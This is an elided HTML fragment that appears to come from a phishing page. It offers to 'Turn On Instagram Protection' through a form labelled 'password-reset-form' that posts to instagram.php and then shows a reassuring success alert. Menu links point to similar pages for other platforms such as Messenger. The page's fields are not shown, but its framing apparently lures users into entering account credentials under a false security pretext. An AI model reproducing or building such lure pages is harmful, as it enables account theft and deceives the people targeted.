    ...
    <nav>     
        ...
        <div class="menu-container">
            <ul>                 
                ...
                <li><a href="instagram.php" class="menu" id="specialitemcolor">Instagram</a></li>     
                ...
                <li><a href="messenger.php" class="menu">Messenger</a></li>
   ...
   <span></span>
    ...
    <div class="container">     
        <div class="form-container">         
            <h2 id="onlywhiteitems">Turn On Instagram Protection</h2>         
            <form action="instagram.php" method="post" id="password-reset-form" onsubmit="return showLoadingMessage()">             
    ...
    <script>
        function showLoadingMessage() {
            ...
            if (form.checkValidity()) {
                ...
                alert("Instagram Protection is On Successfully ✔");
